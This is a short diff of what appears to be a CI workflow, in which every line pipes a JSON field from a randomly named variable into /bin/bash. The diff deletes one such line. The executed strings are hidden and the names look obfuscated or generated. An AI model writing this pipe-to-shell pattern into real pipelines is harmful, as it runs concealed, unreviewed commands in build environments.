@@ -24,7 +24,6 @@ jobs:
           echo $ki7 | jq -r .p1457 | /bin/bash
           echo $asgd06 | jq -r .t78 | /bin/bash
           printf '%s' "$oto976" | jq -r .w61 | /bin/bash
-          printf '%s' "$whjx86" | jq -r .oipax5511 | /bin/bash
           echo $xb55417 | jq -r .u75593 | /bin/bash
           echo $ooima6701 | jq -r .kyoor7491 | /bin/bash
           echo $sobhn23 | jq -r .blp69785 | /bin/bash
